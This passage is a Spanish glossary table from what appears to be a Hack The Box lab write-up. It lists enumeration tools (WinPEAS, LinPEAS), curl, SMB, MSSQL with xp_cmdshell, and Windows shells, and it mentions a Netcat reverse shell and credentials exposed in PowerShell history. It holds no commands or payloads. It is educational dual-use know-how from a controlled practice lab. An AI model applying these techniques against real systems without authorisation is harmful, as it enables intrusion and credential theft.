| **WinPEAS**                 | Enumeración           | Script de escalada de privilegios para Windows. Enumera configuraciones incorrectas, credenciales y vulnerabilidades. | `/usr/share/peass/winpeas/` en Kali Linux                    |
| **LinPEAS**                 | Enumeración           | Equivalente de WinPEAS para sistemas Linux.                                                                   | `/usr/share/peass/linpeas/` en Kali Linux                         |
| **curl**                    | Transferencia de datos| Herramienta de línea de comandos para transferir datos mediante URL. Disponible en Windows 10+.               | Nativo en Windows 10+; preinstalado en Kali Linux                 |
| **SMB (Samba)**             | Protocolo de red      | Protocolo para compartir archivos e impresoras. Vector principal de enumeración y acceso inicial.             | Nativo en Windows; disponible en Linux vía Samba                  |
| **MSSQL**                   | Base de datos         | Microsoft SQL Server. Base de datos corporativa de Microsoft con funcionalidades de ejecución de comandos del SO. | Nativo en entornos Windows Server                                |
| **xp_cmdshell**             | Funcionalidad MSSQL   | Procedimiento almacenado extendido de SQL Server que permite ejecutar comandos del sistema operativo Windows. | Integrado en Microsoft SQL Server (desactivado por defecto)       |
| **PowerShell**              | Shell                 | Entorno de scripting y línea de comandos de Windows. Su historial puede contener credenciales expuestas.      | Nativo en Windows                                                 |
| **CMD (cmd.exe)**           | Shell                 | Terminal de comandos clásica de Windows. Utilizada en la reverse shell obtenida mediante Netcat.              | Nativo en Windows                                                 |
| **Hack The Box (HTB)**      | Plataforma            | Plataforma de práctica de ciberseguridad con máquinas vulnerables en entornos controlados.                    | `https://www.hackthebox.com`                                      |
| **VPN (tun0)**              | Red                   | Interfaz de red virtual generada por la VPN de Hack The Box para conectarse al entorno de laboratorio.        | Archivo `.ovpn` descargable desde HTB                             |
```
